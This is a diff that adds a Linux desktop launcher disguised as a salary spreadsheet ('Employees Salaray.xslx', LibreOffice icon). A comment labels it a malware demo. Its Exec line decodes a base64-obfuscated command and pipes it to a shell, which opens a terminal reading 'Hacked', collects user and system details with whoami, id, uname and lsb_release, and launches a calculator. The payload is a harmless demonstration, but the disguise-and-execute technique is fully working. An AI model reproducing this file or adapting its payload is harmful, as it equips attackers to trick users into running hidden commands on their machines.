@@ -1,0 +1,15 @@
+#!/usr/bin/env xdg-open
+
+[Desktop Entry]
+Version=1.0
+Type=Application
+Terminal=false
+
+Name = Employees Salaray.xslx
+Comment = LibreOffice
+Icon = libreoffice-startcenter
+
+# xterm -title "Ubuntu Desktop Malware Demo - @mazen160" -e "echo -e '[$] Hacked =) !!';whoami; id;uname -a;lsb_release -a;read" & xcalc
+
+Exec = /bin/sh -c "/bin/echo 'eHRlcm0gLXRpdGxlICJVYnVudHUgRGVza3RvcCBNYWx3YXJlIERlbW8gLSBAbWF6ZW4xNjAiIC1lICJlY2hvIC1lICdbJF0gSGFja2VkP1xuQnk6IEBtYXplbjE2MCc7d2hvYW1pOyBpZDt1bmFtZSAtYTtsc2JfcmVsZWFzZSAtYTtyZWFkIiAmIHhjYWxj' | /usr/bin/base64 -d | /bin/sh"
+
